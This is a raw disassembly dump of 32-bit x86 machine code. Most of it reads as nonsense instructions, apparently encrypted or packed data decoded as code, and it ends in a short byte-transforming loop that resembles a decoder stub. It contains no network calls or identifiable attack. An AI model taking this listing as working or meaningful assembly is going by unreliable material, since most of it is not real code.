  420d66:	ins    BYTE PTR es:[edi],dx
  420d67:	test   eax,0xf51a39b0
  420d6c:	out    dx,al
  420d6d:	adc    bl,BYTE PTR [ebp-0x22e2700d]
  420d73:	inc    esp
  420d74:	(bad)  
  420d75:	out    dx,eax
  420d76:	in     eax,dx
  420d77:	mov    bh,0x54
  420d79:	and    DWORD PTR [eax-0x64d7d451],esi
  420d7f:	cli    
  420d80:	mov    DWORD PTR [ebp+0x1ee37223],edx
  420d86:	loop   0x420da0
  420d88:	mov    ch,0x48
  420d8a:	xchg   esp,eax
  420d8b:	leave  
  420d8c:	mov    eax,0xf59e4d88
  420d91:	xchg   DWORD PTR cs:[ebx+ebx*8],ecx
  420d95:	dec    esi
  420d96:	fld    QWORD PTR [esi-0x64cae7e6]
  420d9c:	add    al,0xef
  420d9e:	lock xchg esi,eax
  420da0:	sti    
  420da1:	sbb    ebx,eax
  420da3:	aaa    
  420da4:	bnd jl 0x420dd0
  420da7:	xor    al,0xcf
  420da9:	push   ebp
  420daa:	mov    ah,al
  420dac:	or     al,0xab
  420dae:	sub    eax,0x666628f4
  420db3:	test   al,0xc2
  420db5:	jno    0x420dc0
  420db7:	enter  0x3c2f,0xe2
  420dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dbc:	addr16 add ah,bl
  420dbf:	lea    ecx,[ebx]
  420dc1:	into   
  420dc2:	call   0xd876:0x2ead63b2
  420dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dca:	or     ebx,DWORD PTR [eax-0x7e]
  420dcd:	int3   
  420dce:	mov    dh,0x6a
  420dd0:	inc    ebp
  420dd1:	data16 jb 0x420d60
  420dd4:	push   ss
  420dd5:	lahf   
  420dd6:	std    
  420dd7:	scas   eax,DWORD PTR es:[edi]
  420dd8:	rcl    DWORD PTR [edi],cl
  420dda:	test   al,0x82
  420ddc:	mov    ah,BYTE PTR [eax+ecx*4-0x10]
  420de0:	pop    ecx
  420de1:	retf   
  420de2:	hlt    
  420de3:	jp     0x420e0d
  420de5:	xchg   esi,eax
  420de6:	xchg   edx,eax
  420de7:	pop    ds
  420de8:	push   es
  420de9:	cmp    eax,0x963378b0
  420dee:	jmp    0x420dc0
  420df0:	pop    ecx
  420df1:	pusha  
  420df2:	arpl   WORD PTR [esi+ebp*1+0x16747c1a],cx
  420df9:	outs   dx,DWORD PTR ds:[esi]
  420dfa:	shl    DWORD PTR [eax+0x28ee9b48],0xbc
  420e01:	adc    ch,BYTE PTR [edi]
  420e03:	out    0xc3,eax
  420e05:	jae    0x420dfd
  420e07:	mov    ch,0xb
  420e09:	xor    ecx,ecx
  420e0b:	sar    cl,1
  420e0d:	mov    bl,0x2b
  420e0f:	js     0x420dbd
  420e11:	jmp    0xeb3d6ed1
  420e16:	into   
  420e17:	pop    ax
  420e19:	enter  0xcaac,0xd4
  420e1d:	adc    BYTE PTR [edi],dh
  420e1f:	push   cs
  420e20:	ror    DWORD PTR ds:0xdef68efd,0xb0
  420e27:	add    eax,0xebe2512b
  420e2c:	repnz push esi
  420e2e:	add    eax,0x25106361
  420e33:	fimul  DWORD PTR [ecx+0x6f019458]
  420e39:	xor    eax,esi
  420e3b:	mov    ebx,0x12c9366b
  420e40:	inc    esi
  420e41:	jnp    0x420dd9
  420e43:	pop    ecx
  420e44:	push   ecx
  420e45:	add    DWORD PTR [edx+edx*8-0x28293b42],esp
  420e4c:	scas   al,BYTE PTR es:[edi]
  420e4d:	int3   
  420e4e:	dec    edi
  420e4f:	inc    edi
  420e50:	lds    ebx,FWORD PTR gs:[ecx]
  420e53:	dec    ecx
  420e54:	pop    ds
  420e55:	lds    esp,FWORD PTR [ebx-0x30]
  420e58:	jl     0x420dfa
  420e5a:	gs mov dl,0xda
  420e5d:	cdq    
  420e5e:	nop
  420e5f:	add    eax,0x1dcd421e
  420e64:	jno    0x420ed2
  420e66:	retf   
  420e67:	pop    ds
  420e68:	(bad)  
  420e69:	fdiv   QWORD PTR [eax+0x6ace98aa]
  420e6f:	mov    WORD PTR [esi+esi*2],?
  420e72:	mov    ds:0x5e67332e,al
  420e77:	fild   DWORD PTR [esi+0x4e]
  420e7a:	xor    DWORD PTR [eax+0x40],0x2c607ae1
  420e81:	sbb    dl,BYTE PTR [ebp+ebx*4-0x11]
  420e85:	cli    
  420e86:	sub    bh,ah
  420e88:	cmp    ch,BYTE PTR [ecx-0x6a]
  420e8b:	pop    ebx
  420e8c:	cmc    
  420e8d:	mov    esi,0xa734e3db
  420e92:	lea    edi,cs:[ebp-0x7266668c]
  420e99:	pop    ebx
  420e9a:	sub    eax,0x4df2a4f6
  420e9f:	cwde   
  420ea0:	(bad)  
  420ea1:	ficomp DWORD PTR [ebp-0x16676f53]
  420ea7:	loop   0x420e98
  420ea9:	jnp    0x420ee2
  420eab:	out    0xb5,eax
  420ead:	fcomp  QWORD PTR [esi+0x0]
  420eb0:	push   esi
  420eb1:	(bad)  
  420eb2:	lds    ebx,FWORD PTR [edi]
  420eb4:	out    dx,al
  420eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb6:	jns    0x420e5e
  420eb8:	idiv   DWORD PTR [esi+eax*1+0x9]
  420ebc:	adc    eax,0x5694f2ae
  420ec1:	es ds mov ebx,0xaff2bbe9
  420ec8:	pop    ebx
  420ec9:	mov    ah,0x11
  420ecb:	(bad)  
  420ecc:	push   ebp
  420ecd:	shr    BYTE PTR [edi],cl
  420ecf:	mov    al,0x39
  420ed1:	dec    eax
  420ed2:	loopne 0x420ee0
  420ed4:	inc    edx
  420ed5:	in     eax,dx
  420ed6:	mov    esi,0x46b9dc79
  420edb:	cmp    eax,0x20c73f3c
  420ee0:	clc    
  420ee1:	in     al,dx
  420ee2:	adc    esi,esp
  420ee4:	pop    ds
  420ee5:	and    BYTE PTR [esi+0x67],dh
  420ee8:	sbb    ebx,DWORD PTR [ecx]
  420eea:	pushf  
  420eeb:	sbb    DWORD PTR [edi],ebp
  420eed:	aaa    
  420eee:	call   0x45c6:0x68620932
  420ef5:	jbe    0x420f33
  420ef7:	sbb    ah,BYTE PTR [esi+0x10e32695]
  420efd:	dec    ebp
  420efe:	ja     0x420f08
  420f00:	out    0x67,al
  420f02:	and    edi,DWORD PTR [ebx]
  420f04:	(bad)  
  420f05:	sub    ebx,DWORD PTR [edi]
  420f07:	xchg   DWORD PTR [ebx],esp
  420f09:	stos   BYTE PTR es:[edi],al
  420f0a:	inc    esi
  420f0b:	cs pop ds
  420f0d:	jne    0x420f71
  420f0f:	repnz les edx,FWORD PTR [edi+0x61]
  420f13:	mov    fs:0xc78a7ec5,al
  420f19:	outs   dx,DWORD PTR ds:[esi]
  420f1a:	mov    DWORD PTR [edi+0x62],ecx
  420f1d:	int    0xdb
  420f1f:	mov    al,0x26
  420f21:	mov    ch,BYTE PTR [ecx]
  420f23:	repnz dec esp
  420f25:	push   ds
  420f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f27:	lahf   
  420f28:	jle    0x420ec5
  420f2a:	(bad)  
  420f2b:	jmp    0x420f3e
  420f2d:	xor    DWORD PTR [eax-0x3be2bfba],esi
  420f33:	mov    edx,0xc7abc906
  420f38:	ja     0x420f12
  420f3a:	sub    al,dh
  420f3c:	rcr    BYTE PTR [ebx],0x6d
  420f3f:	aas    
  420f40:	mov    al,0xc1
  420f42:	sbb    bl,dl
  420f44:	stos   DWORD PTR es:[edi],eax
  420f45:	ret    
  420f46:	push   ecx
  420f47:	aam    0x1b
  420f49:	int3   
  420f4a:	lods   eax,DWORD PTR ds:[esi]
  420f4b:	fisttp WORD PTR [ebx-0x445915a2]
  420f51:	jne    0x420f8a
  420f53:	call   0xf016:0xd466099c
  420f5a:	pop    ds
  420f5b:	into   
  420f5c:	cs xchg ecx,eax
  420f5e:	pop    ds
  420f5f:	cwde   
  420f60:	sub    eax,DWORD PTR [edx+0x381c0dbc]
  420f66:	imul   ecx,DWORD PTR [edx+0x2712cabe],0xfffffff7
  420f6d:	pop    edi
  420f6e:	popa   
  420f6f:	call   0x7711e1fa
  420f74:	mov    al,0xed
  420f76:	test   al,0x3a
  420f78:	hlt    
  420f79:	enter  0xff28,0xa2
  420f7d:	retf   
  420f7e:	arpl   WORD PTR [ecx],dx
  420f80:	icebp  
  420f81:	sub    eax,eax
  420f83:	push   ss
  420f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f85:	inc    edi
  420f86:	mov    ds:0xc15a77a5,eax
  420f8b:	inc    esp
  420f8c:	inc    eax
  420f8d:	mov    esi,0xa0340c0c
  420f92:	mov    cs,WORD PTR [ebp-0x65736438]
  420f98:	pop    esp
  420f99:	icebp  
  420f9a:	and    DWORD PTR [eax-0x7e70bb59],ebp
  420fa0:	jp     0x420f5e
  420fa2:	mov    ebp,0x179154d
  420fa7:	into   
  420fa8:	xchg   dl,al
  420faa:	mov    bh,BYTE PTR [ebp-0x117cb78c]
  420fb0:	fimul  DWORD PTR [edi+0x17]
  420fb3:	sub    al,cl
  420fb5:	push   ecx
  420fb6:	sbb    bl,BYTE PTR [ebp-0x70]
  420fb9:	rcr    dh,cl
  420fbb:	fadd   DWORD PTR [eax-0x1c625a93]
  420fc1:	adc    al,0x64
  420fc3:	adc    BYTE PTR [esi-0x58],dh
  420fc6:	(bad)  
  420fc7:	fadd   DWORD PTR [ecx-0x25246da6]
  420fcd:	das    
  420fce:	ret    
  420fcf:	cld    
  420fd0:	(bad)  
  420fd1:	adc    bl,ch
  420fd3:	aam    0xb0
  420fd5:	hlt    
  420fd6:	mul    BYTE PTR [ebx+0x3d0f6d25]
  420fdc:	mov    ecx,0xe5811bc0
  420fe1:	outs   dx,DWORD PTR ds:[esi]
  420fe2:	add    al,BYTE PTR [ecx+0x19fc4cb3]
  420fe8:	push   esp
  420fe9:	(bad)
  420fec:	inc    ebp
  420fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fee:	call   0x935c:0x5d1a9184
  420ff5:	dec    esi
  420ff6:	out    dx,eax
  420ff7:	mov    BYTE PTR [ebx-0x19],ah
  420ffa:	xchg   esp,eax
  420ffb:	test   eax,0x3abf742c
  421000:	imul   ebx,DWORD PTR [ecx],0xb
  421003:	out    0xde,al
  421005:	ja     0x420fd6
  421007:	sbb    eax,0x4e9beb7d
  42100c:	sub    DWORD PTR [esi],0x6d
  42100f:	inc    ebp
  421010:	test   DWORD PTR [ecx+ecx*2+0x7b],0x94e7343
  421018:	jne    0x420ffe
  42101a:	test   BYTE PTR [eax+0x1282e073],al
  421020:	add    DWORD PTR [esi+0x11],ebx
  421023:	fild   QWORD PTR [eax]
  421025:	pop    es
  421026:	cdq    
  421027:	cmp    ch,BYTE PTR [ecx-0x1789fafe]
  42102d:	inc    edi
  42102e:	jl     0x420fe8
  421030:	fstp   QWORD PTR [edi]
  421032:	sbb    al,0x45
  421034:	adc    al,BYTE PTR [ebx]
  421036:	jae    0x421067
  421038:	test   eax,0x404de229
  42103d:	xchg   di,ax
  42103f:	inc    esi
  421040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421041:	jge    0x4210b4
  421043:	ror    BYTE PTR [ebx],0xa1
  421046:	cli    
  421047:	cmp    edx,esp
  421049:	mov    ecx,0x2d21a68f
  42104e:	ins    BYTE PTR es:[edi],dx
  42104f:	dec    ebx
  421050:	xchg   esp,eax
  421051:	pop    ebp
  421052:	xchg   ebp,eax
  421053:	ins    DWORD PTR es:[edi],dx
  421054:	pop    ebx
  421055:	jle    0x421084
  421057:	outs   dx,BYTE PTR ds:[esi]
  421058:	sbb    al,0x8e
  42105a:	push   esp
  42105b:	mov    DWORD PTR [esi],esi
  42105d:	add    DWORD PTR [edx],edi
  42105f:	xchg   BYTE PTR [ebx-0xb],bh
  421062:	mov    DWORD PTR [edi-0x3b],ecx
  421065:	add    ebx,DWORD PTR [eax-0x3150a654]
  42106b:	hlt    
  42106c:	int3   
  42106d:	pop    esp
  42106e:	test   BYTE PTR [esi+0x1ee59f02],bh
  421074:	pop    edi
  421075:	call   0x366a:0x8bd9158f
  42107c:	std    
  42107d:	xor    ch,BYTE PTR [eax]
  42107f:	add    al,0x76
  421081:	mov    al,0x7e
  421083:	mov    bh,0x69
  421085:	repz enter 0x2a4a,0x7d
  42108a:	xlat   BYTE PTR ds:[ebx]
  42108b:	not    bl
  42108d:	mov    ecx,0x52e009be
  421092:	inc    edi
  421093:	lock mov ds:0x141bd60f,al
  421099:	out    0x21,al
  42109b:	cwde   
  42109c:	cmp    ebp,DWORD PTR [edi+0x57]
  42109f:	sub    al,0x18
  4210a1:	and    ch,BYTE PTR [edi+esi*8-0x20]
  4210a5:	mov    eax,ds:0xb78dbf11
  4210aa:	push   esp
  4210ab:	das    
  4210ac:	xchg   ecx,eax
  4210ad:	or     al,0x19
  4210af:	(bad)  
  4210b1:	int    0x1f
  4210b3:	in     al,0x87
  4210b5:	dec    edi
  4210b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210b7:	jns    0x42108e
  4210b9:	pop    ebp
  4210ba:	mov    eax,0x93fb2f8d
  4210bf:	out    0xdf,al
  4210c1:	shr    BYTE PTR ds:0xf9722cd7,cl
  4210c7:	ret    
  4210c8:	leave  
  4210c9:	pop    edx
  4210ca:	repnz push 0x386c6f37
  4210d0:	idiv   DWORD PTR gs:[esi+0x4]
  4210d4:	ss or  cl,ah
  4210d7:	and    edx,eax
  4210d9:	das    
  4210da:	jns    0x421107
  4210dc:	enter  0x3288,0xdb
  4210e0:	out    0x5,al
  4210e2:	dec    esi
  4210e3:	sub    esi,ebx
  4210e5:	or     edx,DWORD PTR [edi+eax*4-0x6ee1f675]
  4210ec:	mov    ebp,0xa840dbd4
  4210f1:	or     bh,al
  4210f3:	leave  
  4210f4:	and    al,0x11
  4210f6:	add    eax,0xcc8848ca
  4210fb:	lea    edx,[edi]
  4210fd:	add    BYTE PTR [esi],0xa4
  421100:	imul   edi,edi,0x94e0321e
  421106:	ror    DWORD PTR [ecx],0xe3
  421109:	js     0x421169
  42110b:	add    ecx,edx
  42110d:	xchg   esp,eax
  42110e:	adc    bh,BYTE PTR [ebx+0x600bfd2a]
  421114:	ja     0x421162
  421116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421117:	fld    TBYTE PTR [eax+0x13d51bf4]
  42111d:	fsubr  DWORD PTR [eax+esi*4-0x40b6abc6]
  421124:	neg    BYTE PTR [ebx+ebp*1-0x1234b3a0]
  42112b:	in     eax,dx
  42112c:	xchg   edi,eax
  42112d:	fs mov ecx,0x624fe3d5
  421133:	mov    esi,0x6fb6741f
  421138:	aas    
  421139:	lods   eax,DWORD PTR ds:[esi]
  42113a:	outs   dx,BYTE PTR ds:[esi]
  42113b:	in     eax,dx
  42113c:	in     eax,dx
  42113d:	mov    dh,BYTE PTR [ecx]
  42113f:	xor    al,0x96
  421141:	mov    ds:0xac518997,eax
  421146:	int3   
  421147:	pop    ebp
  421148:	jae    0x421124
  42114a:	lods   eax,DWORD PTR cs:[esi]
  42114c:	int    0xa7
  42114e:	lods   eax,DWORD PTR ds:[esi]
  42114f:	jp     0x4210fa
  421151:	dec    esi
  421152:	(bad)  
  421153:	and    DWORD PTR [ecx+0x6],eax
  421156:	scas   al,BYTE PTR es:[edi]
  421157:	scas   al,BYTE PTR es:[edi]
  421158:	fs cmp BYTE PTR gs:[eax-0x32],dh
  42115d:	aam    0x91
  42115f:	dec    ebx
  421160:	cmp    ebx,DWORD PTR [edi-0x7db00005]
  421166:	test   eax,0xd14e9148
  42116b:	sbb    ah,bh
  42116d:	nop
  42116e:	mov    bh,bl
  421170:	mov    edx,0x2b252412
  421175:	fwait
  421176:	pop    edi
  421177:	(bad)  [esi+eax*2+0x19]
  42117b:	aas    
  42117c:	test   DWORD PTR [ecx+0x1e4121a8],esi
  421182:	push   cs
  421183:	sub    al,0xd2
  421185:	jo     0x4211a0
  421187:	sbb    BYTE PTR [esi+0x40],0xbb
  42118b:	adc    ah,ah
  42118d:	mov    ch,0x3e
  42118f:	test   DWORD PTR [edi],ebx
  421191:	ret    
  421192:	add    BYTE PTR [esp+esi*1],0x11
  421196:	enter  0x392,0xe8
  42119a:	jne    0x421141
  42119c:	fsubr  QWORD PTR [esi+ecx*8]
  42119f:	push   0xea3599ea
  4211a4:	paddb  mm1,QWORD PTR [ecx+0x51]
  4211a8:	dec    ebp
  4211a9:	cmc    
  4211aa:	outs   dx,BYTE PTR ds:[esi]
  4211ab:	inc    esi
  4211ac:	jecxz  0x4211d2
  4211ae:	xchg   edx,eax
  4211af:	jne    0x4211cc
  4211b1:	add    ecx,DWORD PTR [edi]
  4211b3:	nop
  4211b4:	mov    ch,0xa4
  4211b6:	mov    edi,0x64a33d69
  4211bb:	cld    
  4211bc:	sbb    al,0x5
  4211be:	adc    al,0x60
  4211c0:	mov    ebx,0x705338ee
  4211c5:	mov    edx,0xb5dfbd29
  4211ca:	lahf   
  4211cb:	add    bh,dl
  4211cd:	js     0x4211b0
  4211cf:	cli    
  4211d0:	imul   edx,DWORD PTR [ebp+0x1da6a348],0xe5835095
  4211da:	and    bl,bl
  4211dc:	ss pop eax
  4211de:	jp     0x4211ec
  4211e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211e1:	push   ebx
  4211e2:	fisttp DWORD PTR [ebx]
  4211e4:	or     dl,al
  4211e6:	div    esi
  4211e8:	cmp    bl,BYTE PTR [ebp-0x3b9daa11]
  4211ee:	mov    cl,0xd4
  4211f0:	scas   al,BYTE PTR es:[edi]
  4211f1:	and    ecx,DWORD PTR [ecx]
  4211f3:	ret    
  4211f4:	mov    edx,0xa3cbb6ce
  4211f9:	daa    
  4211fa:	jge    0x42117f
  4211fc:	stos   BYTE PTR es:[edi],al
  4211fd:	jae    0x421216
  4211ff:	inc    ebx
  421200:	and    esi,DWORD PTR [edi+0x56ff42f0]
  421206:	ret    
  421207:	iret   
  421208:	add    al,0xb6
  42120a:	repz pop esp
  42120c:	push   ss
  42120d:	mul    BYTE PTR [edx-0x7f]
  421210:	gs nop
  421212:	ja     0x4211b5
  421214:	sub    al,0xa3
  421216:	adc    bh,BYTE PTR [esi+0x77]
  421219:	inc    edi
  42121a:	dec    ebx
  42121b:	fwait
  42121c:	mov    edi,0xda2281fd
  421221:	icebp  
  421222:	stos   BYTE PTR es:[edi],al
  421223:	cmp    cl,BYTE PTR [edx]
  421225:	(bad)  
  421226:	sub    bl,BYTE PTR [ebp-0x5c2dc073]
  42122c:	dec    esi
  42122d:	mov    al,ds:0x49ad062d
  421232:	push   es
  421233:	inc    eax
  421234:	or     BYTE PTR [ecx],ah
  421236:	sbb    al,0x31
  421238:	clc    
  421239:	push   edi
  42123a:	ss nop
  42123c:	lods   al,BYTE PTR ds:[esi]
  42123d:	shr    BYTE PTR ds:0xdf18127b,1
  421243:	push   0x54c9bb0e
  421248:	sub    al,0xd4
  42124a:	cdq    
  42124b:	jp     0x4212a5
  42124d:	pusha  
  42124e:	jne    0x421210
  421250:	and    eax,0xdc6f2eec
  421255:	shr    ebx,cl
  421257:	data16 das 
  421259:	ds jb  0x42122b
  42125c:	dec    ebp
  42125d:	push   esp
  42125e:	scas   eax,DWORD PTR es:[edi]
  42125f:	adc    al,0x90
  421261:	cmp    al,BYTE PTR [edi-0x60]
  421264:	xchg   esp,eax
  421265:	jne    0x4212e5
  421267:	test   DWORD PTR [ebp-0x34],esp
  42126a:	pop    ecx
  42126b:	std    
  42126c:	mov    ah,0x7d
  42126e:	mov    bl,0x30
  421270:	test   ebp,ebp
  421272:	jb     0x4212b4
  421274:	jp     0x42121b
  421276:	inc    ebx
  421277:	cmp    cl,BYTE PTR [ebx+0x4d35c9ba]
  42127d:	sub    DWORD PTR [edx-0x6e],0xf33bd699
  421284:	(bad)  
  421285:	xor    eax,0x83987da5
  42128a:	rcl    DWORD PTR [edi+eax*8],0x99
  42128e:	addr16 inc esi
  421290:	loop   0x42124b
  421292:	jnp    0x42126a
  421294:	sub    eax,0xaa1d6ba7
  421299:	sbb    ecx,DWORD PTR [edi-0x4c]
  42129c:	test   eax,0xe255c3fb
  4212a1:	sub    eax,ebp
  4212a3:	xor    BYTE PTR [eax+0x3c],dh
  4212a6:	jg     0x4212a2
  4212a8:	mov    BYTE PTR [esi],al
  4212aa:	xchg   edi,eax
  4212ab:	mov    esi,0x90715a50
  4212b0:	and    edx,edx
  4212b2:	push   ss
  4212b3:	mov    esi,0x8759d292
  4212b8:	inc    ecx
  4212b9:	push   ds
  4212ba:	add    eax,0xb09b599f
  4212bf:	mov    ds:0xaf0dc89,eax
  4212c4:	dec    eax
  4212c5:	test   dl,dl
  4212c7:	or     esi,DWORD PTR [ecx-0x31]
  4212ca:	inc    al
  4212cc:	nop
  4212cd:	push   ds
  4212ce:	ja     0x4212ce
  4212d0:	dec    edi
  4212d1:	pop    edx
  4212d2:	shl    DWORD PTR [eax-0x2c],0x21
  4212d6:	xchg   edi,eax
  4212d7:	pmaxub mm7,QWORD PTR [eax+0x5e]
  4212db:	nop
  4212dc:	sbb    eax,0x624fe93b
  4212e1:	shr    esp,cl
  4212e3:	mov    al,0x13
  4212e5:	dec    edi
  4212e6:	nop
  4212e7:	mov    ds:0x5426fb77,eax
  4212ec:	mov    DWORD PTR [ebp+0x63],eax
  4212ef:	cmp    al,0xd6
  4212f1:	out    0x8a,eax
  4212f3:	test   dl,0x5
  4212f6:	fnsave ds:0x77bdd15a
  4212fc:	jp     0x421331
  4212fe:	nop
  4212ff:	inc    eax
  421300:	fimul  DWORD PTR [edi]
  421302:	(bad)  
  421303:	lds    ebp,FWORD PTR [ecx+eiz*8-0x31]
  421307:	push   edx
  421308:	rcl    DWORD PTR [ecx-0x1d],cl
  42130b:	pop    eax
  42130c:	push   ecx
  42130d:	or     BYTE PTR [eax],bh
  42130f:	pop    ebx
  421310:	dec    edx
  421311:	arpl   WORD PTR [eax*2-0x6bfc0fe1],si
  421318:	test   eax,0x7f1bb979
  42131d:	(bad)  
  42131e:	cmp    bl,BYTE PTR cs:[ebp+0x27]
  421322:	rep outs dx,DWORD PTR ds:[esi]
  421324:	not    BYTE PTR [ebx+0x5a440a22]
  42132a:	xchg   ebp,eax
  42132b:	loope  0x42134d
  42132d:	leave  
  42132e:	push   ebp
  42132f:	sub    bh,dl
  421331:	inc    esi
  421332:	sbb    al,0xf4
  421334:	bound  edx,QWORD PTR [ebx+eiz*2+0x21]
  421338:	out    dx,al
  421339:	addr16 and eax,0xdf059189
  42133f:	call   0xd87a:0xe70b6aee
  421346:	adc    ah,BYTE PTR [ebx+eiz*1]
  421349:	pop    edi
  42134a:	xchg   esi,eax
  42134b:	mov    bh,0x2
  42134d:	pop    ds
  42134e:	mov    bh,BYTE PTR [edi+ebp*4-0x59]
  421352:	sbb    al,0x33
  421354:	push   edx
  421355:	or     DWORD PTR [ebx+esi*8],ecx
  421358:	push   0x4c
  42135a:	jmp    0x51a4:0x2f49693
  421361:	or     ecx,esi
  421363:	cmc    
  421364:	inc    esi
  421365:	xchg   esi,eax
  421366:	aad    0x4e
  421368:	inc    eax
  421369:	push   ecx
  42136a:	xor    ch,BYTE PTR [edx]
  42136c:	pop    ecx
  42136d:	repnz (bad) 
  42136f:	(bad)  [edi+0x66b196a7]
  421375:	cwde   
  421376:	dec    DWORD PTR [eax-0x2b]
  421379:	outs   dx,DWORD PTR ds:[esi]
  42137a:	inc    esp
  42137b:	addr16 mov ecx,0xa635867a
  421381:	mov    esp,0x1d7957a8
  421386:	movzx  edx,WORD PTR [edx-0xf]
  42138a:	add    BYTE PTR [edx],bl
  42138c:	imul   esp,DWORD PTR [ecx+0xb238e7f],0xffffffef
  421393:	mov    eax,es:0x9172c528
  421399:	sub    BYTE PTR [ebx],bh
  42139b:	xchg   ebx,eax
  42139c:	gs jnp 0x4213f7
  42139f:	pop    edx
  4213a0:	scas   al,BYTE PTR es:[edi]
  4213a1:	mov    ds:0x654952dd,al
  4213a6:	mov    BYTE PTR [edi-0x68],ch
  4213a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213aa:	enter  0xb667,0xdd
  4213ae:	sbb    eax,0xd0b12889
  4213b3:	xchg   esp,eax
  4213b4:	push   ebx
  4213b5:	pop    ecx
  4213b6:	fwait
  4213b7:	lock js 0x421373
  4213ba:	lds    eax,FWORD PTR [eax-0xef41330]
  4213c0:	stos   BYTE PTR es:[edi],al
  4213c1:	xchg   ebx,eax
  4213c2:	aaa    
  4213c3:	xchg   ecx,eax
  4213c4:	sbb    eax,0xef53d315
  4213c9:	xchg   ebx,eax
  4213ca:	sbb    eax,0x57957b79
  4213cf:	cmp    BYTE PTR [edx+0x39],ch
  4213d2:	push   ebx
  4213d3:	inc    edx
  4213d4:	in     eax,0x5
  4213d6:	addr16 xchg esi,eax
  4213d8:	and    DWORD PTR [ecx+0x74007385],ecx
  4213de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213df:	or     BYTE PTR [ebp-0x4a163105],ch
  4213e5:	dec    ebp
  4213e6:	sub    edi,DWORD PTR [edi+eax*2-0x16]
  4213ea:	jae    0x4213ed
  4213ec:	pop    edx
  4213ed:	(bad)  
  4213ee:	mov    ecx,0xf5ff1257
  4213f3:	and    al,0x50
  4213f5:	ret    0xd65f
  4213f8:	and    eax,0xc51bf3e6
  4213fd:	ret    
  4213fe:	mov    eax,0x87563cd0
  421403:	xlat   BYTE PTR ds:[ebx]
  421404:	repz sub DWORD PTR [ebp-0x9],ebx
  421408:	adc    esp,DWORD PTR [ecx+0x67]
  42140b:	xor    al,cl
  42140d:	dec    esi
  42140e:	fsub   QWORD PTR [ecx]
  421410:	mov    cl,BYTE PTR [edi+ebx*4]
  421413:	jo     0x4213ca
  421415:	inc    esi
  421416:	push   eax
  421417:	fstp   st(7)
  421419:	cdq    
  42141a:	jns    0x42145b
  42141c:	aad    0x82
  42141e:	inc    esp
  42141f:	lock jbe 0x421456
  421422:	pop    es
  421423:	sub    al,0x23
  421425:	out    dx,eax
  421426:	dec    ebp
  421427:	int3   
  421428:	(bad)  
  421429:	mov    ebx,0x4cf98e69
  42142e:	pusha  
  42142f:	lahf   
  421430:	ror    BYTE PTR [ecx+0xbec019b],cl
  421436:	jb     0x4213e9
  421438:	dec    esi
  421439:	jg     0x42147e
  42143b:	loope  0x42147d
  42143d:	sti    
  42143e:	adc    DWORD PTR [edx-0xe],esp
  421441:	enter  0x4992,0x7e
  421445:	mov    ch,0x6b
  421447:	xchg   edx,eax
  421448:	push   ebx
  421449:	fild   QWORD PTR [edx]
  42144b:	and    esi,DWORD PTR [eax-0x35814ab4]
  421451:	adc    al,0x66
  421453:	push   cs
  421454:	xchg   ebx,eax
  421455:	fsin   
  421457:	xor    ecx,esp
  421459:	mov    dl,0x7e
  42145b:	fild   QWORD PTR [ebp-0x264002f2]
  421461:	stos   BYTE PTR es:[edi],al
  421462:	push   esp
  421463:	pop    esi
  421464:	dec    esi
  421465:	push   ecx
  421466:	shl    bh,0xc4
  421469:	mov    ch,0x4c
  42146b:	mov    DWORD PTR [edx-0x42c36b18],0x6ff784d1
  421475:	test   al,0x56
  421477:	or     eax,0xb8dddf72
  42147c:	cmp    eax,0x25d3af12
  421481:	pushf  
  421482:	mov    bh,0xed
  421484:	mov    edx,DWORD PTR [ecx]
  421486:	xor    bl,BYTE PTR [eax+0x67d6f1f]
  42148c:	mov    eax,ds:0xe7d24f19
  421491:	into   
  421492:	mov    esi,0x50e0634e
  421497:	inc    eax
  421498:	sbb    DWORD PTR [edx+0x60ef31b0],ebp
  42149e:	sbb    al,0x1e
  4214a0:	loope  0x4214cc
  4214a2:	sub    eax,0x961adec8
  4214a7:	repz and DWORD PTR cs:[ebp+0x4eb44246],ebp
  4214af:	fisubr WORD PTR [ebp+0x55fbfc10]
  4214b5:	mov    bl,0xa6
  4214b7:	fisttp WORD PTR [edi]
  4214b9:	cmp    eax,0x158ae8a7
  4214be:	fxch   st(4)
  4214c0:	inc    esp
  4214c1:	or     ah,BYTE PTR [edi+0x2b7c55ab]
  4214c7:	jle    0x421534
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
